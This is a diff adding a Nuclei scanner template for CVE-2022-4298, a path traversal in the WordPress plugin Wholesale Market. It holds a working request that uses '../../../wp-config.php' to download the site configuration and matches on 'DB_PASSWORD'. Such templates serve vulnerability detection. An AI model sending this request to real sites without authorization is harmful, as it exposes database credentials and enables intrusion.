@@ -1,0 +1,34 @@
+id: cve-2022-4298
+
+info:
+  name: Wholesale Market File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The WordPress plugin Wholesale Market version prior to 2.2.1 has a path traversal vulnerability. This allows attackers to download arbitrary files from the server without performing authorization checks or validating user input.
+  reference:
+    - https://wpscan.com/vulnerability/7485ad23-6ea4-4018-88b1-174312a0a478
+  tags: file-read, wordpress, path-traversal
+
+variables:
+  filePath: "../../../wp-config.php"
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download={{filePath}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "DB_PASSWORD"
+        part: body
+      - type: word
+        words:
+          - "wp-config.php"
+        part: header
